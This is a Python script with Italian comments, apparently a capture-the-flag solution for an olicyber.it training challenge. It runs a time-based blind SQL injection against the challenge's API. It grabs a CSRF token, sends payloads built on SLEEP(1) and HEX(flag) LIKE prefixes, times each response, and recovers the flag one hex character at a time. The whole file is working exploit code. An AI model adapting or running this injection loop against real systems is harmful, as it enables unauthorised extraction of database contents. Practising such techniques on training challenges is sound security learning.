import requests
import time
import binascii

# ==============================================================================
# CLASSE INJ (Gestione CSRF e connessione)
# ==============================================================================
class Inj:
    def __init__(self, host):
        self.sess = requests.Session()
        self.base_url = '{}/api/'.format(host)
        self._refresh_csrf_token()

    def _refresh_csrf_token(self):
        resp = self.sess.get(self.base_url + 'get_token')
        resp = resp.json()
        self.token = resp['token']

    def _do_raw_req(self, url, query):
        headers = {'X-CSRFToken': self.token}
        data = {'query': query }
        return self.sess.post(url,json=data, headers=headers).json()

    # Usiamo solo l'endpoint 'time' per questa sfida
    def time(self, query):
        url = self.base_url + 'time'
        response = self._do_raw_req(url, query)
        return response.get('result', '')

# ==============================================================================
# SCRIPT DI ESTRAZIONE TIME-BASED
# ==============================================================================

inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

print("[*] Connessione stabilita.")
print("[*] Avvio attacco TIME-BASED Blind SQLi.")
print("[!] Attenzione: L'estrazione sarà lenta (minimo 1 secondo per ogni carattere corretto)...\n")

while True:
    trovato = False
    
    for c in dictionary:
        # Costruiamo il payload con SLEEP(1) sulla tabella 'flags' e colonna 'flag'
        question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result+c}%')='1"
        
        # Facciamo partire il cronometro
        start = time.time()
        
        # Inviamo la query
        inj.time(question)
        
        # Fermiamo il cronometro e calcoliamo il tempo trascorso
        elapsed = time.time() - start
        
        # Se il server ci ha messo più di 1 secondo (o un valore vicino, es. 0.9 per latenza),
        # significa che la condizione SLEEP(1) si è attivata!
        if elapsed > 0.95: 
            result += c
            print(f"[+] Trovato: {c} -> HEX parziale: {result} (Tempo: {elapsed:.2f}s)")
            trovato = True
            break
            
    # Se testiamo tutto il dizionario senza far "dormire" il server, abbiamo finito
    if not trovato:
        break

print("\n[*] Estrazione HEX terminata:", result)

# Conversione finale
if result:
    try:
        flag = bytes.fromhex(result).decode('ascii')
        print("\n" + "="*40)
        print(f"[!] FLAG DECIFRATA: {flag}")
        print("="*40)
    except Exception as e:
        print(f"[-] Errore nella conversione ASCII: {e}")
else:
    print("[-] Estrazione fallita. Prova ad alzare il valore di SLEEP se la connessione è lenta.")